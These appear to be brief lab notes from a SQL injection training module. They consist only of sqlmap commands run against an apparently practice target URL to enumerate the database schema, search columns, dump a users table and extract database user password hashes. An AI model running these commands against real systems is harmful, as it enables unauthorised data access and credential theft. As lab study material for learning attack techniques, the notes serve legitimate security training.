# Advanced Database Enumeration

## Schema

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --schema
```

## Searching for Data

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -C style --search
```

## Password Cracking

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -D testdb -T users --dump
```

## Password Cracking (Database Users)

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --passwords
```
